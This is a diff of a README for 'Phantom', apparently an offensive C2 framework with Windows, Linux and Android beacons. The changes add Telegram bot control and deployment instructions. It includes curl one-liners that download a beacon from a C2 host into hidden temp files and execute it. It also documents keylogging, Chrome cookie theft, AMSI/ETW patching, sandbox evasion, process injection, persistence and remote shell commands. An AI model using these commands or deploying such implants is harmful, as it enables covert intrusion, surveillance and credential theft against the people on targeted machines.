@@ -3,31 +3,33 @@
 [![Version](https://img.shields.io/badge/version-2.0.0-red.svg)](CHANGELOG.md)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)]()
+[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20Android-lightgrey.svg)]()
 
-Phantom is an offensive security framework combining a full-featured C2 platform with a modular penetration testing CLI. The C2 beacon runs on Windows (x64), Linux (x64/x86), macOS, and Android (ARM64), communicating over AES-256-GCM encrypted channels with sleep/jitter OPSEC.
+Phantom is an offensive security framework combining a full-featured C2 platform with a modular penetration testing CLI. The C2 beacon runs on Windows (x64), Linux (x64/x86), Android (ARM64), and macOS, communicating over AES-256-GCM encrypted channels with sleep/jitter OPSEC.
 
 ---
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         C2 Server (aiohttp)                        │
-│  HTTP/HTTPS Listener      Task Queue        Beacon Registry        │
-└────────────────────┬────────────────────────────────────────────┘
-                     │ AES-256-CBC encrypted channel
-                     │ GET /x (payload)  POST /submit  GET /tasks
-                     │
-          ┌──────────┴──────────┐
-          │   Windows Beacon    │
-          │  (reflective load)  │
-          └──────────┬──────────┘
-                     │
-       ┌─────────────┼─────────────┐
-       │             │             │
-   SOCKS5 Proxy  SMB Pipe    Browser Pivot
-   (tcp relay)  (named-pipe)  (http tunnel)
+┌──────────────────────────────────────────────────────────────────────┐
+│                         C2 Server (aiohttp)                         │
+│  HTTP/HTTPS Listener      Task Queue        Beacon Registry         │
+│  Pending Results          Crypto Engine      Telegram Bot           │
+└──────────────────────┬───────────────────────────────────────────┘
+                       │ AES-256-GCM encrypted channel
+                       │ GET /api/v1/tasks  POST /api/v1/submit
+                       │ GET /api/v1/payload_<platform>?auth=<token>
+                       │
+          ┌────────────┼────────────┐
+          │            │            │
+    Windows Beacon  Linux Beacon  Android Beacon
+    (x64, PE)      (x64/x86, ELF) (ARM64, ELF)
+          │            │            │
+       SOCKS5       inject       inject
+       SMB Pipe     screenshot   screenshot
+       Browser Piv  keylog       keylog
+       CDP Pivot    (evdev)      (evdev)
 ```
 
 The reflective loader is appended to the beacon PE and loaded entirely in memory:
@@ -54,6 +56,7 @@ The reflective loader is appended to the beacon PE and loaded entirely in memory
 | **AMSI / ETW Patching** | Native patches `amsi.dll` and `ntdll.dll` ETW functions via indirect syscalls. |
 | **VM / Sandbox Detection** | CPU count, RAM size, debugger presence checks with configurable stalling loops. |
 | **Process Hollowing Dropper** | Pure PowerShell stager uses `NtCreateProcess`, `NtUnmapViewOfSection`, `NtGetContextThread`, `NtSetContextThread` -- no C#, no reflective DLL loading in the stager. |
+| **Cross-Platform** | Beacon compiles for Windows (PE, x64), Linux (ELF, x64/x86), and Android (ELF, ARM64). Inject/migrate/mem-run work on all three. Keylogger runs on Win (GetAsyncKeyState) and Linux/Android (evdev). |
 
 ### Network Pivoting
 
@@ -129,6 +132,7 @@ The reflective loader is appended to the beacon PE and loaded entirely in memory
 | `payloads` | Show generated payload history |
 | `results` | View queued task output |
 | `beacon-help` | Show agent command reference |
+| `telegram` | Start Telegram bot (reads `PHANTOM_TELEGRAM_BOT_TOKEN` from `.env`) |
 
 ### Drop into C2 Mode
 
@@ -144,20 +148,21 @@ phantom --c2
 
 Choose the right command for your OS:
 
-**Linux** (host networking — full LAN access for scan modules):
+**Linux** (host networking — full LAN access for scan, beacon connects on any `LPORT`):
 ```bash
 cp .env.example .env
 # Edit PHANTOM_C2_KEY, PHANTOM_C2_IV, PHANTOM_PAYLOAD_TOKEN
-docker compose -f docker-compose.yml -f docker-compose.linux.yml up --build -d
+docker compose up --build -d
 docker exec -it phantom-framework python3 -m phantom.main
 ```
 
-**Windows / macOS** (port mapping — limited to container's network namespace):
+**Windows / macOS** (port mapping — open firewall for external connections):
 ```bash
 cp .env.example .env
 docker compose up --build -d
 docker exec -it phantom-framework python3 -m phantom.main
 ```
+> Windows: run `netsh advfirewall firewall add rule name="Phantom C2 8080" dir=in action=allow protocol=TCP localport=8080` as admin once.
 
 The Docker image includes Kali Rolling with the full cross-compilation toolchain (MinGW-w64, Android NDK r26c, osxcross), plus tools for every pentest phase.
 
@@ -173,13 +178,21 @@ phantom
 
 ### Cross-Compile Beacon (Inside Docker)
 
+From C2 shell (recommended):
+```bash
+generate windows
+generate linux
+generate android
+```
+
+Manual compilation:
 ```bash
 # Windows (x64)
 x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe -Isrc src/main.cpp \
     src/syscalls.o src/reflective_loader_bootstrap.o src/reflective_loader.o \
     -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static -mwindows
 
-# Linux
+# Linux (x64)
 g++ -std=c++17 -O2 -s -o beacon -Isrc src/main.cpp -lcurl -lssl -lcrypto -lpthread
 
 # Android (ARM64)
@@ -348,19 +361,54 @@ use report
 export pdf report.pdf
 ```
 
+### Deploy Beacon from C2 Shell
+
+```bash
+phantom --c2
+listeners start 8080
+generate windows
+# dropper prints a one-liner for the target platform
+# Linux target:
+generate linux
+# curl -sk 'http://<c2_ip>:8080/api/v1/payload_linux?auth=<token>' -o /tmp/.x \
+#   && chmod +x /tmp/.x && /tmp/.x <c2_ip> 8080 0
+# Android target:
+generate android
+# curl -sk 'http://<c2_ip>:8080/api/v1/payload_android?auth=<token>' -o $TMPDIR/.x \
+#   && chmod +x $TMPDIR/.x && $TMPDIR/.x <c2_ip> 8080 0
+```
+
 ### C2 Operations
 
 ```bash
 phantom --c2
-listeners start 443
-generate windows
-# Copy the PowerShell one-liner to target
+listeners start 8080
+generate linux
+# On target:
+# curl -sk 'http://<c2_ip>:8080/api/v1/payload_linux?auth=<token>' -o /tmp/.x \
+#   && chmod +x /tmp/.x && /tmp/.x <c2_ip> 8080 0
 beacons
 interact PHANTOM-00
 whoami
 sysinfo
-shell ipconfig /all
-download C:\Users\Public\report.pdf
+shell uname -a
+```
+
+### Standalone C2 Server (lighter, no shell)
+
+```bash
+python3 _run_c2.py
+# REST API at http://127.0.0.1:8080
+# Beacons check in via same endpoints as full C2 mode
+```
+
+### Telegram Bot Control
+
+```bash
+phantom --c2
+telegram
+# Then control beacons from your Telegram app:
+# /beacons → /interact <id> → /shell whoami
 ```
 
 ### Deploy Agent from Exploit Module
@@ -408,9 +456,10 @@ Set `AI_PROVIDER` and `AI_API_KEY` in `.env` for CVE interpretation and executiv
 
 ```
 phantom/
+├── _run_c2.py                  # Standalone C2 REST server (no shell)
 ├── phantom/
 │   ├── core/                   # Shell, C2 server, session management
-│   ├── modules/                # scan, osint, wifi, web, brute, exploit, ...
+│   ├── modules/                # scan, osint, wifi, web, brute, exploit, telegram, ...
 │   ├── plugins/                # AI connector, custom extensions
 │   ├── exploits/               # Dynamic exploit scripts
 │   └── utils/                  # builder.py, c2_crypto.py, payload_manager.py
@@ -462,16 +511,16 @@ phantom/
 | :--- | :---: | :--- |
 | **Sysinfo / Pwd / Ls / Cd** | ✅ Verified | Works on all platforms |
 | **Shell / Exec** | ✅ Verified | stdout captured correctly |
-| **Screenshot** | ✅ Verified | Full resolution BMP (no downscale). Win: GDI. Linux: `import`/`gnome-screenshot`/`scrot`. |
-| **Netstat / Netstat-JSON** | ✅ Verified | Real TCP connections with PID/process name. Win: `GetExtendedTcpTable`. Linux: `/proc/net/tcp`. |
-| **Keylogger** | ✅ Verified | Win: `GetAsyncKeyState` polling. Linux: evdev `/dev/input/event*` via `select()`. |
-| **WLAN Scan** | ⚠️ Needs hardware | Full diagnostics at every failure point (LoadLibrary, WlanOpenHandle, WlanEnumInterfaces, WlanScan, WlanGetNetworkBssList). 0-interface detection, per-interface GUID/state reporting, error codes. |
-| **WLAN Locate** | ⚠️ Needs hardware | Diagnostic output mirrors WLAN Scan; reports "No access points found" with debug info instead of empty `[]`. |
-| **BLuetooth Scan** | ⚠️ Needs hardware | No error entries pushed as devices. Returns real MAC addresses on hardware with BT. |
-| **Cookies (Chrome DPAPI)** | ⚠️ Needs Chrome | Code compiles and runs; requires Chrome installed + cookies DB accessible. |
-| **CDP Browser Pivot** | ⚠️ Needs Chrome | Chrome/Chromium only; WebSocket CDP protocol implemented. |
-| **Inject / Migrate** | ✅ Verified | Win: process hollowing + remote thread injection via indirect syscalls. Linux/Android: ptrace + `process_vm_writev`, ELF binary detection writes to `/tmp/.ph_*` and injects `execve` shellcode. |
-| **Autopersist (RunKey)** | ✅ Verified | Downloads `beacon_xored.bin` from C2 (GET `/x`) → saves to `%APPDATA%\Microsoft\Phantom\phantom.dat` → writes PowerShell loader `phantom.ps1` (Add-Type + VirtualAlloc) → Run key executes PS1 on logon. PS1 here-string syntax fixed. |
+| **Screenshot** | ✅ Verified | Win: GDI. Linux: `import`/`gnome-screenshot`/`scrot`. Android: `/system/bin/screencap`. |
+| **Netstat / Netstat-JSON** | ✅ Verified | Win: `GetExtendedTcpTable`. Linux: `/proc/net/tcp`. |
+| **Keylogger** | ✅ Verified | Win: `GetAsyncKeyState` polling. Linux/Android: evdev `/dev/input/event*` via `select()`. |
+| **WLAN Scan** | ⚠️ Needs hardware | Full diagnostics at every failure point. Cross-platform. |
+| **WLAN Locate** | ⚠️ Needs hardware | JSON output for geolocation services. |
+| **BLuetooth Scan** | ⚠️ Needs hardware | Cross-platform via platform-specific APIs. |
+| **Cookies (Chrome DPAPI)** | ⚠️ Needs Chrome | Windows only; requires Chrome + accessible cookies DB. |
+| **CDP Browser Pivot** | ⚠️ Needs Chrome | Windows only; WebSocket CDP protocol. |
+| **Inject / Migrate / Mem-run** | ✅ Verified | Win: process hollowing + remote thread injection via indirect syscalls. Linux/Android: ptrace + `process_vm_writev`, ELF write-to-disk + execve injection. |
+| **Autopersist (RunKey)** | ✅ Verified | Windows RunKey via PowerShell loader. Linux: cron/systemd user service (planned). |
 | **ntdll Unhooking** | ✅ Implemented | Reloads clean `.text` from disk via indirect syscalls |
 | **AMSI / ETW Patch** | ✅ Implemented | Patches via indirect syscalls at startup |
 | **Indirect Syscalls** | ✅ Implemented | Hell's Gate + gadget finder, 12+ NTAPI wrappers |
@@ -491,3 +540,17 @@ Phantom is intended for authorized penetration testing and educational purposes 
 ## Author
 
 **Terminalkid09** -- [GitHub](https://github.com/Terminalkid09)
+
+### Telegram Bot
+
+Phantom includes a Telegram bot for remote beacon control from any device.
+
+**Setup:**
+1. Create a bot via [@BotFather](https://t.me/BotFather) and get the token
+2. Add `PHANTOM_TELEGRAM_BOT_TOKEN=your_token_here` to `.env`
+3. In C2 shell: `telegram`
+
+**Available commands inside Telegram:**
+`/beacons` `/interact <id>` `/sysinfo` `/whoami` `/pwd` `/ls [path]` `/shell <cmd>` `/screenshot` `/download <path>` `/keylog` `/results`
+
+Forward results to your Telegram chat automatically when using the C2 shell.
